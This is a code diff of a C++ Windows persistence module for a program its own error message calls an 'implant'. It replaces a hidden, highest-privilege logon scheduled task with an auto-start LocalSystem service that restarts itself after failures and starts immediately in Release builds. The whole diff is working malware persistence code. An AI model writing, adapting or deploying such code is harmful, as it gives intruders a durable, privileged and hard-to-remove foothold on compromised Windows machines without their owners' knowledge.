@@ -1,55 +1,139 @@
 #include "persistence.h"
 #include "config.h"
 #include "error.h"
+#include "log.h"
 #include <windows.h>
-#include <iostream>
+#include <string>
 
-bool install_persistence() {
-    char exe_path[MAX_PATH];
-    if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
-        std::cerr << format_last_error("impossible de recuperer le chemin de l'implant") << std::endl;
-        return false;
+namespace {
+
+constexpr DWORD   RecoveryDelayMs  = 5000;
+constexpr DWORD   RecoveryResetDay = 86400;   // 1 jour, en secondes
+
+std::wstring current_exe_path() {
+    wchar_t buffer[MAX_PATH] = {};
+    if (GetModuleFileNameW(nullptr, buffer, MAX_PATH) == 0) {
+        return {};
+    }
+    return buffer;
+}
+
+// Configure les recovery actions : redémarrage après 5 s, 3 fois, reset 1 jour.
+bool apply_failure_actions(SC_HANDLE service) {
+    SC_ACTION actions[3] = {};
+    for (auto& a : actions) {
+        a.Type  = SC_ACTION_RESTART;
+        a.Delay = RecoveryDelayMs;
     }
 
-    std::string task_name = TaskName;
+    SERVICE_FAILURE_ACTIONSW sfa{};
+    sfa.dwResetPeriod = RecoveryResetDay;
+    sfa.cActions      = 3;
+    sfa.lpsaActions   = actions;
 
-    // On entoure le chemin de l'exe de doubles guillemets pour gérer les espaces
-    std::string quoted_exe_path = "\"\\\"" + std::string(exe_path) + "\\\"\"";
-
-    // On utilise le chemin complet de schtasks.exe + /RL HIGHEST
-    std::string command = "C:\\Windows\\System32\\schtasks.exe /Create /SC ONLOGON /TN \""
-        + task_name + "\" /TR " + quoted_exe_path + " /RL HIGHEST /F";
-
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    ZeroMemory(&pi, sizeof(pi));
-
-    char cmd_buffer[2048];
-    strcpy_s(cmd_buffer, command.c_str());
-
-    // bInheritHandles = TRUE : schtasks herite de la console et peut donc
-    // expliquer lui-meme son echec (visible en build Debug).
-    if (!CreateProcessA(NULL, cmd_buffer, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        std::cerr << format_last_error("impossible de lancer schtasks") << std::endl;
-        return false;
-    }
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    DWORD exit_code = 0;
-    GetExitCodeProcess(pi.hProcess, &exit_code);
-
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    if (exit_code != 0) {
-        // Un code de sortie de processus n'est pas un code d'erreur Win32 :
-        // le passer a FormatMessage donnerait un texte trompeur.
-        std::cerr << "schtasks a echoue (code de sortie " << exit_code << ")" << std::endl;
+    if (!ChangeServiceConfig2W(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa)) {
+        log_line(format_error(GetLastError(), "ChangeServiceConfig2(FAILURE_ACTIONS)"));
         return false;
     }
     return true;
+}
+
+bool apply_description(SC_HANDLE service) {
+    SERVICE_DESCRIPTIONW desc{};
+    desc.lpDescription = const_cast<LPWSTR>(ServiceDescW);
+    // Non bloquant : une description manquante n'empêche pas le service de tourner.
+    return ChangeServiceConfig2W(service, SERVICE_CONFIG_DESCRIPTION, &desc) != 0;
+}
+
+}  // namespace
+
+bool install_persistence() {
+    const std::wstring exe = current_exe_path();
+    if (exe.empty()) {
+        log_line(format_last_error("GetModuleFileNameW"));
+        return false;
+    }
+
+    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
+    if (!scm) {
+        log_line(format_last_error("OpenSCManager"));
+        return false;
+    }
+
+    SC_HANDLE service = CreateServiceW(
+        scm,
+        ServiceNameW,
+        ServiceDisplayNameW,                // display name
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,
+        SERVICE_ERROR_NORMAL,
+        exe.c_str(),
+        nullptr, nullptr, nullptr,
+        nullptr,                            // LocalSystem
+        nullptr);
+
+    bool created_now = true;
+    if (!service) {
+        const DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_EXISTS) {
+            // Idempotence : on rafraîchit la config d'un service existant.
+            created_now = false;
+            service = OpenServiceW(scm, ServiceNameW,
+                SERVICE_CHANGE_CONFIG | SERVICE_START);
+            if (!service) {
+                log_line(format_last_error("OpenService(existing)"));
+                CloseServiceHandle(scm);
+                return false;
+            }
+        }
+        else {
+            log_line(format_error(err, "CreateService"));
+            CloseServiceHandle(scm);
+            return false;
+        }
+    }
+
+    // Sur un service existant, on aligne aussi le binaire et le type de démarrage
+    // (utile si l'exe a été déplacé).
+    if (!created_now) {
+        if (!ChangeServiceConfigW(service,
+                SERVICE_NO_CHANGE,
+                SERVICE_AUTO_START,
+                SERVICE_NO_CHANGE,
+                exe.c_str(),
+                nullptr, nullptr, nullptr, nullptr, nullptr,
+                ServiceNameW)) {
+            log_line(format_error(GetLastError(), "ChangeServiceConfig(binPath)"));
+        }
+    }
+
+    const bool ok = apply_failure_actions(service);
+    apply_description(service);   // best-effort
+
+    // Démarrage immédiat en Release (en Debug, on évite le doublon avec la console interactive).
+#ifdef NDEBUG
+    SERVICE_STATUS_PROCESS status{};
+    DWORD needed = 0;
+    const bool status_ok = QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
+        reinterpret_cast<LPBYTE>(&status), sizeof(status), &needed) != 0;
+
+    if (status_ok && status.dwCurrentState == SERVICE_RUNNING) {
+        log_line("service deja en cours d'execution");
+    }
+    else {
+        if (!StartServiceW(service, 0, nullptr)) {
+            const DWORD err = GetLastError();
+            if (err != ERROR_SERVICE_ALREADY_RUNNING) {
+                log_line(format_error(err, "StartService"));
+            }
+        }
+    }
+#else
+    log_line("mode Debug : service configure en AUTO_START (demarrera au reboot ou via sc start)");
+#endif
+
+    CloseServiceHandle(service);
+    CloseServiceHandle(scm);
+    return ok;
 }
